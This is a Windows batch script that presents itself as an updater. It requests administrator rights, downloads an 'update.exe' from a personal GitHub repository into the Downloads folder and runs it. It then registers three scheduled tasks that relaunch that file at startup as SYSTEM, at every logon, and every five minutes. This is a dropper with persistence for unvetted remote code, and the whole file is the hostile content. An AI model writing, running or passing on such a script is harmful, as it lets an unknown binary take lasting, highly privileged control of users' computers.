@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)


set "urlexe=https://github.com/gbg379594/OS/raw/refs/heads/main/update.exe"
set "outputexe=%USERPROFILE%\Downloads\Update\update.exe"

timeout /t 1 >nul

echo Downloading file...
powershell -Command "Invoke-WebRequest -Uri '%urlexe%' -OutFile '%outputexe%'"


echo Running the downloaded file...
start "" "%outputexe%"

@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$path='%USERPROFILE%\Downloads\Update\update.exe'; ^
Register-ScheduledTask -TaskName 'Update_Startup' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute $path) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force; ^
Register-ScheduledTask -TaskName 'Update_Logon' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute $path) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Force; ^
Register-ScheduledTask -TaskName 'Update_Every5Min' -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)) -Action (New-ScheduledTaskAction -Execute $path) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Force"



